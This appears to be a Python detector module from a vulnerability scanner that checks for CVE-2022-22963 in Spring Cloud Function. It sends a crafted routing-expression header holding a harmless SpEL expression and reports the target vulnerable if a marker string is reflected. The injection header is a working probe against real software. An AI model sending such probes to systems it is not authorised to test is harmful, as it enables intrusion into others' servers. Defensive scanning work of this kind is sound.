"""CVE-2022-22963 - Spring Cloud Function SpEL."""
from .base import CVEDetector, CVEResult


class SpringCloudFunction(CVEDetector):
    cve_id = "CVE-2022-22963"
    title = "Spring Cloud Function SpEL via spring.cloud.function.routing-expression"
    severity = "critical"
    affected = "Spring Cloud Function 3.1.6 / 3.2.2 and earlier"
    tags = ["cve-2022-22963", "spring", "spel", "rce"]

    def probe(self, base, baseline_body):
        marker = "cvespringfn7x7"
        hdr = (
            "spring.cloud.function.routing-expression: "
            f"T(java.lang.String).valueOf('{marker}')"
        )
        for p in ("/functionRouter", "/", "/function"):
            status, body = self._post(base + p, data="test",
                                        headers=[hdr,
                                                 "Content-Type: application/x-www-form-urlencoded"],
                                        timeout=8)
            if not body:
                continue
            if marker in body and marker not in baseline_body:
                return CVEResult(
                    vulnerable=True,
                    url=base + p,
                    evidence=f"SpEL evaluated: {marker} reflected",
                    detail="Spring Cloud Function evaluates SpEL in routing-expression header.",
                )
        return None
